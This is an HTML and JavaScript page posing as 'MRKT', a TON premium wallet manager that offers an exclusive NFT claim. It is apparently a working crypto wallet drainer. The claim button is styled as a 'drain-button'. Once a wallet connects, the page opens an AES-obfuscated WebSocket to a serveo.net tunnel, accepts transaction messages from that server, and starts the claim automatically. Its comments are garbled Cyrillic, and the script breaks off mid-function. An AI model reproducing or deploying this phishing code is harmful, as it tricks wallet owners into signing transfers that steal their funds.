<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoWolf</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        /* –í–∞—à–∏ —Å—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background: #ffd700;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: #000000;
            border-radius: 24px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 3px solid #333333;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #0088cc, #006699);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.4);
        }
        
        .logo img {
            width: 40px;
            height: 40px;
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            color: #ffd700;
            margin-bottom: 12px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .subtitle {
            font-size: 16px;
            color: #cccccc;
            margin-bottom: 32px;
        }
        
        .connect-section {
            margin-bottom: 20px;
        }
        
        .info-message {
            background: rgba(255, 215, 0, 0.1);
            border: 2px solid #ffd700;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            font-size: 15px;
            color: #ffd700;
            line-height: 1.4;
            font-weight: 500;
        }
        
        .drain-button {
            width: 100%;
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            border: 2px solid #ffd700;
            border-radius: 12px;
            height: 52px;
            font-weight: 600;
            color: #000000;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .drain-button:hover {
            background: linear-gradient(135deg, #ffed4e, #fff176);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.4);
        }
        
        .drain-button:disabled {
            background: #666666;
            color: #999999;
            cursor: not-allowed;
            transform: none;
            border-color: #666666;
        }
        
        .disconnect-button {
            width: 100%;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            border: 2px solid #ff4444;
            border-radius: 12px;
            height: 40px;
            font-weight: 600;
            color: white;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .disconnect-button:hover {
            background: linear-gradient(135deg, #ff6666, #ff0000);
            transform: translateY(-2px);
        }
        
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #cccccc;
        }

        .ton-connect-button {
            width: 100%;
        }

        .status-message {
            margin: 15px 0;
            padding: 12px;
            border-radius: 10px;
            font-weight: 500;
            display: none;
        }
        
        .status-success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        
        .status-error {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            color: #ff0000;
        }
        
        .status-info {
            background: rgba(255, 215, 0, 0.2);
            border: 1px solid #ffd700;
            color: #ffd700;
        }

        .wallet-info {
            background: rgba(255, 215, 0, 0.1);
            border: 2px solid #ffd700;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            display: none;
        }
        
        .wallet-address {
            color: #ffd700;
            font-weight: 600;
            word-break: break-all;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ton.org/download/ton_symbol.png" alt="TON">
        </div>
        
        <h1 class="title">MRKT</h1>
        <p class="subtitle">TON Premium Wallet Manager</p>
        
        <div class="connect-section">
            <div id="ton-connect" class="ton-connect-button"></div>
        </div>
        
        <div id="walletInfo" class="wallet-info">
            <div class="wallet-address" id="walletAddress"></div>
            <button onclick="disconnectWallet()" class="disconnect-button">
                üö´ Disconnect Wallet
            </button>
        </div>
        
        <div class="info-message">
            üê∫ Connect your TON wallet and claim your exclusive NFT<br>
            Secure ‚Ä¢ Fast ‚Ä¢ Premium Experience
        </div>
        
        <button id="claimButton" onclick="claimNFT()" class="drain-button" disabled>
            üéÅ CLAIM PREMIUM NFT
        </button>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div class="footer">
            Powered by TON Blockchain ‚Ä¢ CryptoWolf System
        </div>
    </div>

    <script>
        // ==================== AES IMPLEMENTATION ====================
        var Aes = {};

        Aes.cipher = function (input, w) {
            var Nb = 4;
            var Nr = w.length / Nb - 1;
            var state = [[], [], [], []];
            for (var i = 0; i < 4 * Nb; i++) state[i % 4][Math.floor(i / 4)] = input[i];

            state = Aes.addRoundKey(state, w, 0, Nb);

            for (var round = 1; round < Nr; round++) {
                state = Aes.subBytes(state, Nb);
                state = Aes.shiftRows(state, Nb);
                state = Aes.mixColumns(state, Nb);
                state = Aes.addRoundKey(state, w, round, Nb);
            }

            state = Aes.subBytes(state, Nb);
            state = Aes.shiftRows(state, Nb);
            state = Aes.addRoundKey(state, w, Nr, Nb);

            var output = new Array(4 * Nb);
            for (var i = 0; i < 4 * Nb; i++) output[i] = state[i % 4][Math.floor(i / 4)];

            return output;
        };

        Aes.keyExpansion = function (key) {
            var Nb = 4;
            var Nk = key.length / 4;
            var Nr = Nk + 6;
            var w = new Array(Nb * (Nr + 1));
            var temp = new Array(4);

            for (var i = 0; i < Nk; i++) {
                var r = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]];
                w[i] = r;
            }

            for (var i = Nk; i < (Nb * (Nr + 1)); i++) {
                w[i] = new Array(4);
                for (var t = 0; t < 4; t++) temp[t] = w[i - 1][t];
                if (i % Nk == 0) {
                    temp = Aes.subWord(Aes.rotWord(temp));
                    for (var t = 0; t < 4; t++) temp[t] ^= Aes.rCon[i / Nk][t];
                } else if (Nk > 6 && i % Nk == 4) {
                    temp = Aes.subWord(temp);
                }
                for (var t = 0; t < 4; t++) w[i][t] = w[i - Nk][t] ^ temp[t];
            }

            return w;
        };

        Aes.subBytes = function (s, Nb) {
            for (var r = 0; r < 4; r++) {
                for (var c = 0; c < Nb; c++) s[r][c] = Aes.sBox[s[r][c]];
            }
            return s;
        };

        Aes.shiftRows = function (s, Nb) {
            var t = new Array(4);
            for (var r = 1; r < 4; r++) {
                for (var c = 0; c < 4; c++) t[c] = s[r][(c + r) % Nb];
                for (var c = 0; c < 4; c++) s[r][c] = t[c];
            }
            return s;
        };

        Aes.mixColumns = function (s, Nb) {
            for (var c = 0; c < 4; c++) {
                var a = new Array(4);
                var b = new Array(4);
                for (var i = 0; i < 4; i++) {
                    a[i] = s[i][c];
                    b[i] = s[i][c] & 0x80 ? s[i][c] << 1 ^ 0x011b : s[i][c] << 1;
                }
                s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3];
                s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3];
                s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3];
                s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3];
            }
            return s;
        };

        Aes.addRoundKey = function (state, w, rnd, Nb) {
            for (var r = 0; r < 4; r++) {
                for (var c = 0; c < Nb; c++) state[r][c] ^= w[rnd * 4 + c][r];
            }
            return state;
        };

        Aes.subWord = function (w) {
            for (var i = 0; i < 4; i++) w[i] = Aes.sBox[w[i]];
            return w;
        };

        Aes.rotWord = function (w) {
            var tmp = w[0];
            for (var i = 0; i < 3; i++) w[i] = w[i + 1];
            w[3] = tmp;
            return w;
        };

        Aes.sBox = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16];

        Aes.rCon = [
            [0x00, 0x00, 0x00, 0x00],
            [0x01, 0x00, 0x00, 0x00],
            [0x02, 0x00, 0x00, 0x00],
            [0x04, 0x00, 0x00, 0x00],
            [0x08, 0x00, 0x00, 0x00],
            [0x10, 0x00, 0x00, 0x00],
            [0x20, 0x00, 0x00, 0x00],
            [0x40, 0x00, 0x00, 0x00],
            [0x80, 0x00, 0x00, 0x00],
            [0x1b, 0x00, 0x00, 0x00],
            [0x36, 0x00, 0x00, 0x00]
        ];

        Aes.Ctr = {};

        Aes.Ctr.encrypt = function (plaintext, password, nBits) {
            var blockSize = 16;
            if (!(nBits == 128 || nBits == 192 || nBits == 256)) return '';
            
            var Utf8 = {
                encode: function(strUni) {
                    var strUtf = strUni.replace(/[\u0080-\u07ff]/g, function(c) {
                        var cc = c.charCodeAt(0);
                        return String.fromCharCode(0xc0 | cc >> 6, 0x80 | cc & 0x3f);
                    });
                    strUtf = strUtf.replace(/[\u0800-\uffff]/g, function(c) {
                        var cc = c.charCodeAt(0);
                        return String.fromCharCode(0xe0 | cc >> 12, 0x80 | cc >> 6 & 0x3F, 0x80 | cc & 0x3f);
                    });
                    return strUtf;
                },
                decode: function(strUtf) {
                    var strUni = strUtf.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function(c) {
                        var cc = ((c.charCodeAt(0) & 0x0f) << 12) | ((c.charCodeAt(1) & 0x3f) << 6) | (c.charCodeAt(2) & 0x3f);
                        return String.fromCharCode(cc);
                    });
                    strUni = strUni.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(c) {
                        var cc = (c.charCodeAt(0) & 0x1f) << 6 | c.charCodeAt(1) & 0x3f;
                        return String.fromCharCode(cc);
                    });
                    return strUni;
                }
            };

            var Base64 = {
                code: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                encode: function(str, utf8encode) {
                    utf8encode = (typeof utf8encode == 'undefined') ? false : utf8encode;
                    var o1, o2, o3, bits, h1, h2, h3, h4, e = [], pad = '', c, plain, coded;
                    var b64 = Base64.code;

                    plain = utf8encode ? Utf8.encode(str) : str;

                    c = plain.length % 3;
                    if (c > 0) {
                        while (c++ < 3) {
                            pad += '=';
                            plain += '\0';
                        }
                    }

                    for (c = 0; c < plain.length; c += 3) {
                        o1 = plain.charCodeAt(c);
                        o2 = plain.charCodeAt(c + 1);
                        o3 = plain.charCodeAt(c + 2);

                        bits = o1 << 16 | o2 << 8 | o3;

                        h1 = bits >> 18 & 0x3f;
                        h2 = bits >> 12 & 0x3f;
                        h3 = bits >> 6 & 0x3f;
                        h4 = bits & 0x3f;

                        e[c / 3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
                    }
                    coded = e.join('');
                    coded = coded.slice(0, coded.length - pad.length) + pad;
                    return coded;
                },
                decode: function(str, utf8decode) {
                    utf8decode = (typeof utf8decode == 'undefined') ? false : utf8decode;
                    var o1, o2, o3, h1, h2, h3, h4, bits, d = [], plain, coded;
                    var b64 = Base64.code;

                    coded = utf8decode ? Utf8.decode(str) : str;

                    for (var c = 0; c < coded.length; c += 4) {
                        h1 = b64.indexOf(coded.charAt(c));
                        h2 = b64.indexOf(coded.charAt(c + 1));
                        h3 = b64.indexOf(coded.charAt(c + 2));
                        h4 = b64.indexOf(coded.charAt(c + 3));

                        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;

                        o1 = bits >>> 16 & 0xff;
                        o2 = bits >>> 8 & 0xff;
                        o3 = bits & 0xff;

                        d[c / 4] = String.fromCharCode(o1, o2, o3);
                        if (h4 == 0x40) d[c / 4] = String.fromCharCode(o1, o2);
                        if (h3 == 0x40) d[c / 4] = String.fromCharCode(o1);
                    }
                    plain = d.join('');
                    return utf8decode ? Utf8.decode(plain) : plain;
                }
            };

            plaintext = Utf8.encode(plaintext);
            password = Utf8.encode(password);
            
            var nBytes = nBits / 8;
            var pwBytes = new Array(nBytes);
            for (var i = 0; i < nBytes; i++) {
                pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
            }
            var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));
            key = key.concat(key.slice(0, nBytes - 16));
            
            var counterBlock = new Array(blockSize);

            var nonce = (new Date()).getTime();
            var nonceMs = nonce % 1000;
            var nonceSec = Math.floor(nonce / 1000);
            var nonceRnd = Math.floor(Math.random() * 0xffff);

            for (var i = 0; i < 2; i++) counterBlock[i] = (nonceMs >>> i * 8) & 0xff;
            for (var i = 0; i < 2; i++) counterBlock[i + 2] = (nonceRnd >>> i * 8) & 0xff;
            for (var i = 0; i < 4; i++) counterBlock[i + 4] = (nonceSec >>> i * 8) & 0xff;

            var ctrTxt = '';
            for (var i = 0; i < 8; i++) ctrTxt += String.fromCharCode(counterBlock[i]);

            var keySchedule = Aes.keyExpansion(key);

            var blockCount = Math.ceil(plaintext.length / blockSize);
            var ciphertxt = new Array(blockCount);
            for (var b = 0; b < blockCount; b++) {
                for (var c = 0; c < 4; c++) counterBlock[15 - c] = (b >>> c * 8) & 0xff;
                for (var c = 0; c < 4; c++) counterBlock[15 - c - 4] = (b / 0x100000000 >>> c * 8)

                var cipherCntr = Aes.cipher(counterBlock, keySchedule);
                var blockLength = b < blockCount - 1 ? blockSize : (plaintext.length - 1) % blockSize + 1;
                var cipherChar = new Array(blockLength);

                for (var i = 0; i < blockLength; i++) {
                    cipherChar[i] = cipherCntr[i] ^ plaintext.charCodeAt(b * blockSize + i);
                    cipherChar[i] = String.fromCharCode(cipherChar[i]);
                }
                ciphertxt[b] = cipherChar.join('');
            }

            var ciphertext = ctrTxt + ciphertxt.join('');
            ciphertext = Base64.encode(ciphertext);
            return ciphertext;
        };

        Aes.Ctr.decrypt = function (ciphertext, password, nBits) {
            var blockSize = 16;
            if (!(nBits == 128 || nBits == 192 || nBits == 256)) return '';
            
            var Utf8 = {
                encode: function(strUni) {
                    var strUtf = strUni.replace(/[\u0080-\u07ff]/g, function(c) {
                        var cc = c.charCodeAt(0);
                        return String.fromCharCode(0xc0 | cc >> 6, 0x80 | cc & 0x3f);
                    });
                    strUtf = strUtf.replace(/[\u0800-\uffff]/g, function(c) {
                        var cc = c.charCodeAt(0);
                        return String.fromCharCode(0xe0 | cc >> 12, 0x80 | cc >> 6 & 0x3F, 0x80 | cc & 0x3f);
                    });
                    return strUtf;
                },
                decode: function(strUtf) {
                    var strUni = strUtf.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function(c) {
                        var cc = ((c.charCodeAt(0) & 0x0f) << 12) | ((c.charCodeAt(1) & 0x3f) << 6) | (c.charCodeAt(2) & 0x3f);
                        return String.fromCharCode(cc);
                    });
                    strUni = strUni.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(c) {
                        var cc = (c.charCodeAt(0) & 0x1f) << 6 | c.charCodeAt(1) & 0x3f;
                        return String.fromCharCode(cc);
                    });
                    return strUni;
                }
            };

            var Base64 = {
                code: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                encode: function(str, utf8encode) {
                    utf8encode = (typeof utf8encode == 'undefined') ? false : utf8encode;
                    var o1, o2, o3, bits, h1, h2, h3, h4, e = [], pad = '', c, plain, coded;
                    var b64 = Base64.code;

                    plain = utf8encode ? Utf8.encode(str) : str;

                    c = plain.length % 3;
                    if (c > 0) {
                        while (c++ < 3) {
                            pad += '=';
                            plain += '\0';
                        }
                    }

                    for (c = 0; c < plain.length; c += 3) {
                        o1 = plain.charCodeAt(c);
                        o2 = plain.charCodeAt(c + 1);
                        o3 = plain.charCodeAt(c + 2);

                        bits = o1 << 16 | o2 << 8 | o3;

                        h1 = bits >> 18 & 0x3f;
                        h2 = bits >> 12 & 0x3f;
                        h3 = bits >> 6 & 0x3f;
                        h4 = bits & 0x3f;

                        e[c / 3] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
                    }
                    coded = e.join('');
                    coded = coded.slice(0, coded.length - pad.length) + pad;
                    return coded;
                },
                decode: function(str, utf8decode) {
                    utf8decode = (typeof utf8decode == 'undefined') ? false : utf8decode;
                    var o1, o2, o3, h1, h2, h3, h4, bits, d = [], plain, coded;
                    var b64 = Base64.code;

                    coded = utf8decode ? Utf8.decode(str) : str;

                    for (var c = 0; c < coded.length; c += 4) {
                        h1 = b64.indexOf(coded.charAt(c));
                        h2 = b64.indexOf(coded.charAt(c + 1));
                        h3 = b64.indexOf(coded.charAt(c + 2));
                        h4 = b64.indexOf(coded.charAt(c + 3));

                        bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;

                        o1 = bits >>> 16 & 0xff;
                        o2 = bits >>> 8 & 0xff;
                        o3 = bits & 0xff;

                        d[c / 4] = String.fromCharCode(o1, o2, o3);
                        if (h4 == 0x40) d[c / 4] = String.fromCharCode(o1, o2);
                        if (h3 == 0x40) d[c / 4] = String.fromCharCode(o1);
                    }
                    plain = d.join('');
                    return utf8decode ? Utf8.decode(plain) : plain;
                }
            };

            ciphertext = Base64.decode(ciphertext);
            password = Utf8.encode(password);
            
            var nBytes = nBits / 8;
            var pwBytes = new Array(nBytes);
            for (var i = 0; i < nBytes; i++) {
                pwBytes[i] = isNaN(password.charCodeAt(i)) ? 0 : password.charCodeAt(i);
            }
            var key = Aes.cipher(pwBytes, Aes.keyExpansion(pwBytes));
            key = key.concat(key.slice(0, nBytes - 16));
            
            var counterBlock = new Array(8);
            var ctrTxt = ciphertext.slice(0, 8);
            for (var i = 0; i < 8; i++) counterBlock[i] = ctrTxt.charCodeAt(i);

            var keySchedule = Aes.keyExpansion(key);

            var nBlocks = Math.ceil((ciphertext.length - 8) / blockSize);
            var ct = new Array(nBlocks);
            for (var b = 0; b < nBlocks; b++) ct[b] = ciphertext.slice(8 + b * blockSize, 8 + b * blockSize + blockSize);
            ciphertext = ct;
            
            var plaintxt = new Array(ciphertext.length);

            for (var b = 0; b < nBlocks; b++) {
                for (var c = 0; c < 4; c++) counterBlock[15 - c] = ((b) >>> c * 8) & 0xff;
                for (var c = 0; c < 4; c++) counterBlock[15 - c - 4] = (((b + 1) / 0x100000000 - 1) >>> c * 8) & 0xff;

                var cipherCntr = Aes.cipher(counterBlock, keySchedule);
                var plaintxtByte = new Array(ciphertext[b].length);
                for (var i = 0; i < ciphertext[b].length; i++) {
                    plaintxtByte[i] = cipherCntr[i] ^ ciphertext[b].charCodeAt(i);
                    plaintxtByte[i] = String.fromCharCode(plaintxtByte[i]);
                }
                plaintxt[b] = plaintxtByte.join('');
            }

            var plaintext = plaintxt.join('');
            plaintext = Utf8.decode(plaintext);
            return plaintext;
        };

        // ==================== –û–°–ù–û–í–ù–û–ô –ö–û–î –ö–õ–ò–ï–ù–¢–ê ====================
        let tonConnectUI = null;
        let isWebSocketConnected = false;
        let ws = null;
        let myEncryption = '';
        let clientEncryption = '';
        let signature = '';

        // –§—É–Ω–∫—Ü–∏–∏ cipher/decipher –¥–ª—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –æ–±–º–µ–Ω–∞ –∫–ª—é—á–∞–º–∏
        function createCipher(salt) {
            const textToChars = text => text.split('').map(c => c.charCodeAt(0));
            const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
            const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);

            return text => text.split('')
                .map(textToChars)
                .map(applySaltToChar)
                .map(byteHex)
                .join('');
        }
        function generateHash() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2);
    return timestamp + random;
}

        function createDecipher(salt) {
            const textToChars = text => text.split('').map(c => c.charCodeAt(0));
            const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
            return encoded => encoded.match(/.{1,2}/g)
                .map(hex => parseInt(hex, 16))
                .map(applySaltToChar)
                .map(charCode => String.fromCharCode(charCode))
                .join('');
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è SHA256 —Ö–µ—à–∞
        async function getSHA256Hash(str) {
    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(str);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    } catch (error) {
        console.error('‚ùå SHA256 hash error:', error);
        // Fallback: –ø—Ä–æ—Å—Ç–æ–µ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –µ—Å–ª–∏ crypto.subtle –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        return Math.abs(hash).toString(36);
    }
}
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ—Ä–º–∞—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞ (encrypted:checksum)
async function encryptForServer(data, key) {
    try {
        const jsonData = JSON.stringify(data);
        console.log('üìù Data to encrypt:', jsonData);
        
        const encrypted = Aes.Ctr.encrypt(jsonData, key, 256);
        console.log('üîê Encrypted data:', encrypted);
        
        const hash = await getSHA256Hash(encrypted);
        console.log('üìä SHA256 hash:', hash);
        
        const checksum = Aes.Ctr.encrypt(hash, signature, 256);
        console.log('üîè Checksum:', checksum);
        
        const result = `${encrypted}:${checksum}`;
        console.log('üì® Final encrypted payload:', result);
        
        return result;
    } catch (error) {
        console.error('‚ùå Encryption error:', error);
        throw error;
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ—Ä–º–∞—Ç–µ —Å–µ—Ä–≤–µ—Ä–∞ (encrypted:checksum)
async function decryptFromServer(encryptedData, key) {
    try {
        console.log('üîì Decrypting data:', encryptedData);
        
        if (!encryptedData || typeof encryptedData !== 'string') {
            throw new Error('Invalid encrypted data: ' + typeof encryptedData);
        }

        const parts = encryptedData.split(':');
        console.log('üì¶ Data parts:', parts);
        
        if (parts.length !== 2) {
            throw new Error('Invalid data format, expected encrypted:checksum, got ' + parts.length + ' parts');
        }

        const [encrypted, checksum] = parts;

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º checksum
        const decryptedChecksum = Aes.Ctr.decrypt(checksum, signature, 256);
        const expectedChecksum = await getSHA256Hash(encrypted);
        
        console.log('üîç Checksum verification:', {
            decryptedChecksum,
            expectedChecksum,
            match: decryptedChecksum === expectedChecksum
        });

        if (decryptedChecksum !== expectedChecksum) {
            throw new Error('Checksum verification failed');
        }

        // –î–µ—à–∏—Ñ—Ä—É–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        const decrypted = Aes.Ctr.decrypt(encrypted, key, 256);
        console.log('üìÑ Decrypted content:', decrypted);
        
        return decrypted;
    } catch (error) {
        console.error('‚ùå Decryption error:', error);
        throw error;
    }
}

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TON Connect
        function initTonConnect() {
            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                buttonRootId: 'ton-connect'
            });

            tonConnectUI.onStatusChange((wallet) => {
                if (wallet) {
                    showWalletInfo(wallet);
                    document.getElementById('claimButton').disabled = false;
                    connectWebSocket();
                } else {
                    hideWalletInfo();
                    document.getElementById('claimButton').disabled = true;
                }
            });
        }

        // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ WebSocket —Å–µ—Ä–≤–µ—Ä—É
        // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ WebSocket —Å–µ—Ä–≤–µ—Ä—É

function connectWebSocket() {
    try {
        console.log('üîå Attempting WebSocket connection...');
        
        // –°–±—Ä–æ—Å –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å–æ—Å—Ç–æ—è–Ω–∏–π
        myEncryption = '';
        clientEncryption = '';
        signature = '';
        
        ws = new WebSocket('wss://93242baa9595b48603c440569f664246.serveo.net');
        
        ws.onopen = function() {
            console.log('‚úÖ WebSocket connected successfully');
            isWebSocketConnected = true;
            showStatus('Connected to server', 'success');
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
            console.log('üîç WebSocket state after connection:', {
                readyState: ws.readyState,
                isWebSocketConnected: isWebSocketConnected
            });
        };
        
        ws.onmessage = function(event) {
            console.log('üì® Raw WebSocket message:', event.data);
            try {
                const data = JSON.parse(event.data);
                console.log('üì® Parsed WebSocket message:', data);
                
                // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ –ø–æ–ª—é action
                if (data.action === 'connected') {
                    console.log('üîê Received server encryption key');
                    handleServerConnected(data);
                }
                else if (data.action === 'safety') {
                    console.log('üîí Received safety challenge');
                    handleSafetyChallenge(data);
                }
                else if (data.action === 'check') {
                    console.log('üîí Received safety challenge from server');
                    handleSafetyChallenge(data);
                }
                else if (data.action === 'w') {
                    console.log('‚úÖ Server ready for requests');
                    showStatus('Server is ready!', 'success');
                }
                else if (data.action === 'messages') {
                    console.log('üì¶ Received transaction messages');
                    handleTransactionMessages(data);
                }
                else if (data.action === 'done') {
                    console.log('‚úÖ Operation completed');
                    showStatus('Operation completed successfully', 'success');
                }
                else if (data.action === 'close') {
                    console.log('‚ùå Server closed connection');
                    showStatus('Server closed connection', 'error');
                }
                else if (data.action === 'wait') {
    console.log('‚úÖ Server handshake complete, ready for requests');
    showStatus('Secure connection established! Ready to claim NFT.', 'success');
    
    // –¢–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ –≤—ã–∑—ã–≤–∞—Ç—å claimNFT
    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—ã–∑—ã–≤–∞–µ–º claimNFT –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ handshake
    setTimeout(() => {
        if (tonConnectUI?.connected) {
            console.log('üîÑ Auto-initiating NFT claim after handshake...');
            claimNFT();
        }
    }, 1000);
}
                else {
                    console.log('‚ùì Unknown server action:', data.action, data);
                }
            } catch (parseError) {
                console.error('‚ùå Failed to parse WebSocket message:', parseError, event.data);
            }
        };
        
        ws.onclose = function(event) {
            console.log('‚ùå WebSocket disconnected:', {
                code: event.code,
                reason: event.reason,
                wasClean: event.wasClean
            });
            isWebSocketConnected = false;
            showStatus('Disconnected from server', 'error');
            
            if (event.code !== 1006) {
